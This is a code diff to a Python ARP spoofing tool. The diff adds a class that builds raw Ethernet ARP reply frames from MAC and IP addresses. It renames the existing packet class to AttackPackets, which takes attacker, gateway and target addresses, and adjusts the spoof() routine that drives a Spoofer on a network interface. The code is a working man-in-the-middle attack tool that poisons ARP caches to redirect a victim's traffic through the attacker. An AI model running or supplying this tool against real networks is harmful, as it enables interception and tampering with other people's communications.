@@ -18,6 +18,60 @@ i = ' ' * 4  # Basic indentation level
 
 
 class ARPPacket(object):
+    def __init__(self, sender_hdwr: str, sender_proto: str,
+                 target_hdwr: str, target_proto: str,
+                 ethertype: bytes = b'\x08\x06',  # ARP Ethernet II
+                 htype: bytes = b'\x00\x01',      # Ethernet
+                 ptype: bytes = b'\x08\x00',      # IP
+                 hlen: bytes = b'\x06',
+                 plen: bytes = b'\x04',
+                 oper: bytes = b'\x00\x02'):      # ARP REPLY message
+        self.sender_hdwr = sender_hdwr
+        self.sender_proto = sender_proto
+        self.target_hdwr = target_hdwr
+        self.target_proto = target_proto
+        self.ethertype = ethertype
+        self.htype = htype
+        self.ptype = ptype
+        self.hlen = hlen
+        self.plen = plen
+        self.oper = oper
+        self.contents = None
+        self.build_packet()
+
+    def __set_hardware_addrs_as_bytes(self, *args):
+        def hdwr_to_hex(mac):
+            return b''.join(bytes.fromhex(octet) for octet in
+                            re.split('[:-]', mac))
+        for hdwr, hdwr_addr in zip(('b_sender_hdwr', 'b_target_hdwr'), args):
+            setattr(self, hdwr, hdwr_to_hex(hdwr_addr))
+
+    def __set_protocol_addrs_as_bytes(self, *args):
+        for proto, proto_addr in zip(('b_sender_proto', 'b_target_proto'), args):
+            setattr(self, proto, inet_aton(proto_addr))
+
+    def __build_ethernet_frame(self):  # IEEE 802.3
+        self.ethernet_frame = self.b_target_hdwr \
+                              + self.b_sender_hdwr \
+                              + self.ethertype
+
+    def __build_arp_payload(self, *args):
+        self.arp_payload = b''.join(args) \
+                           + self.b_sender_hdwr \
+                           + self.b_sender_proto \
+                           + self.b_target_hdwr \
+                           + self.b_target_proto
+
+    def build_packet(self):  # IETF RFC 826
+        self.__set_hardware_addrs_as_bytes(self.sender_hdwr, self.target_hdwr)
+        self.__set_protocol_addrs_as_bytes(self.sender_proto, self.target_proto)
+        self.__build_ethernet_frame()
+        self.__build_arp_payload(self.htype, self.ptype, self.hlen, self.plen,
+                                 self.oper)
+        self.contents = b''.join((self.ethernet_frame, self.arp_payload))
+
+
+class AttackPackets(object):
     def __init__(self, attacker_mac: str, gateway_mac: str, target_mac: str,
                  gateway_ip: str, target_ip: str):
         self.__set_ip_addresses_to_bytes(gateway_ip, target_ip)
@@ -96,9 +150,9 @@ class Spoofer(object):
 
 def spoof(args):
     """Controls the flow of execution of the ARP Spoofer tool."""
-    packets = ARPPacket(attacker_mac=args.attackermac, gateway_mac=args.gatemac,
-                        target_mac=args.targetmac, gateway_ip=args.gateip,
-                        target_ip=args.targetip)
+    packets = AttackPackets(attacker_mac=args.attackermac, gateway_mac=args.gatemac,
+                            target_mac=args.targetmac, gateway_ip=args.gateip,
+                            target_ip=args.targetip)
     spoofer = Spoofer(interface=args.interface, arp_packets=packets)
 
     current_time = time.strftime("%H:%M:%S", time.localtime())
